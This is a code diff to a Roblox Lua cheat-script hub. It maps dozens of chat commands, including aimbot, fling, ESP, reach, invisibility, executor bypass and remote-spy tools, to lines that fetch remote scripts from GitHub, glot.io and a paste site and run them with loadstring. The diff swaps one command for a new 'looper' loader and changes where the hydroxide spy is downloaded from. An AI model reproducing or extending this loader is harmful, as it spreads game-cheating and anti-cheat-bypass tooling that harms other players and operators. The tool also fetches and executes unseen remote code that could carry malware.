@@ -1,7 +1,7 @@
 return function(scriptBox, player)
     local commands = {
         ";dhex", ";qcmd", ";straw", ";krunox", ";harked", ";comet",
-        ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";conprint", ";caranims",
+        ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";looper", ";caranims",
         ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bp5", ";bp6", ";bp7", ";bp8", ";bp9", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth", ";antierr", ";HDAcmdbar", ";AKA",
         ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";invis3", ";tel3", ";roa", ";akp1", ";akp2", ";akp3", ";keyb3", ";keyb4", ";cvb", ";ska", ";reach", ";reach2", ";reach3", ";reach4", ";hitbox", ";aimbot", ";aimlock", ";cfling", ";finger", ";finger2", ";spdmtr", ";gripfling",
         ";prox", ";rochips", ";fc1", ";fc2", ";synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";cspy", ";slock", ";wibtt", ";acl", ";crouch", ";srp3", ";srp4", ";tptool", ";ngp", ";fling", ";esp", ";radar", ";OCDtool", ";fc4", ";guneditor",
@@ -25,8 +25,8 @@ return function(scriptBox, player)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Synapse-x/refs/heads/main/Synapse%20x"))()
         elseif code == ";saveexec" then
             loadstring(game:HttpGet("https://glot.io/snippets/hjvegxt5rt/raw/saveexec.lua"))()
-        elseif code == ";conprint" then
-            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/FE-console-typer/raw/refs/heads/main/Console%20printer"))()
+        elseif code == ";looper" then
+            loadstring(game:HttpGet("https://glot.io/snippets/hkafrbmxdj/raw/CodeLooper.lua"))()
         elseif code == ";antierr" then
             loadstring(game:HttpGet("https://glot.io/snippets/hcfoitpvco/raw/AntiError.lua"))()
         elseif code == ";caranims" then
@@ -85,7 +85,7 @@ a(b({Url=e}).Body)()
         elseif code == ";rspy" then
             loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
         elseif code == ";hydroxide" then
-            loadstring(game:HttpGet("https://paste.myconan.net/617098.txt"))()
+            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/hydroxide.lua"))()
         elseif code == ";silentspy" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/FryzerHub/Biggestscript/refs/heads/main/SilentSpy"))()
         elseif code == ";knpc2" then
